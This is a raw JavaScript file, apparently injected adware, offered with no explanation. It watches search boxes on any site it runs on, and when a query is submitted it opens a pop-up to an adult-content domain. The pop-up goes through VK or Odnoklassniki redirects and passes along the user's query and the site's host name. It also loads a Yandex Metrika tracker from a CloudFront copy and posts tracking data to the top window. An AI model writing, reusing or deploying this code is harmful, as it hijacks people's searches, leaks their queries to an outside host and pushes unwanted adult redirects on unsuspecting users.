try{(function(){
/*330*/try{(function(){(function(_doc, _win){

	var _gp = 822115;
	var _frc = 822115;
	var _landLink = 'https://vk.com/away.php?to=';
    var _landLinkRedirect = 'http://xury.ru/blowjob4?text=';
	var _t3kLink = '//anghabar.ru/pix';

    var _version = "4";
	var _host = _doc.location.host;
	var _path = _doc.location.pathname;

	var _clicked = 0;
	var _checkedClassName = '____s11f4gg3362j';
	var _lastChanged = null;
	var _dhFlag = false;

	var _linkRedirect = [
		"https://vk.com/away.php?to=",
		"https://vkontakte.ru/away.php?to=",
		"https://ok.ru/dk?cmd=logExternal&st.name=externalLinkRedirect&st.source=1&st.tid=1&st.cmd=logExternal&st.link=",
		"https://www.odnoklassniki.ru/dk?cmd=logExternal&st.name=externalLinkRedirect&st.source=1&st.tid=1&st.cmd=logExternal&st.link="
	];
	 
	var rand = Math.floor(Math.random() * _linkRedirect.length);
	_landLink = _linkRedirect[rand];
		
	var _i = setInterval(function() {
		if(_clicked) { clearInterval(_i); return; }
		_func();
	}, 1000);
	
	var _clickFunc = function(ev) {
		if(_lastChanged && !_clicked) {
			var _value = _lastChanged.value;
			
				if(_value) {
					if (_value == parseInt(_value) || _value.length <= 4) {
					} else {
						_clicked = true;
						var openlink = _landLink + encodeURIComponent(_landLinkRedirect + _value + "&d=" + _host + "&v=" + _version);
						_win.open(openlink);
						ev.preventDefault();
					}
				}
			
		}
	};
	
	function _func() {
	
		var _elements = _doc.querySelectorAll('input[type=search],input[type=text][name*=search],input[type=text][id*=search],input[type=text][name*=keywords],input[type=text][name=q],input[type=text][name=s]');
		
		if(_dhFlag === false && _elements.length > 0) {
			_dhFlag = true;
			_addEvent('click', _doc, function(ev) {
				_clickFunc(ev);
			});
		}
		
		for(var k = 0; k < _elements.length; k++) {
			var _element = _elements[k];
			if(_element.className.indexOf(_checkedClassName) === -1) {
				_element.className += ' ' + _checkedClassName;
				_addEvent('change', _element, function(ev) {
					_lastChanged = ev.srcElement;
				});
				_addEvent('click', _element, function(ev) {
					_lastChanged = ev.srcElement;
				});
				_addEvent('keyup', _element, function(ev) {
					_lastChanged = ev.srcElement;
					if(ev.keyCode == 13) {
						_clickFunc(ev);
					}
				});
			}
		}
	}
	
	function _addEvent(_evnt, _elem, _func) {
        if (_elem.addEventListener)
            _elem.addEventListener(_evnt, _func, false);
        else if (_elem.attachEvent) {
            _elem.attachEvent("on" + _evnt, _func);
        }
        else {
            _elem[_evnt] = _func;
        }
    }

})(document,window);
})();}catch(ex){};
/*332*/try{(function(){(function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter42992929 = new Ya.Metrika({ id:42992929, clickmap:true, trackLinks:true, accurateTrackBounce:true, ut:"noindex" }); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = "https://d31j93rd8oukbv.cloudfront.net/metrika/watch_ua.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks");})();}catch(ex){};})();}catch(ex){};(function() { try {window.top.postMessage({key: "serv_x1", command: "set", data: {"PLSC": "330:1_1_1501754470_13_2017-08-03_0|332:1_1_1501754470_13_2017-08-03_0"}}, '*');}catch(e){};})();
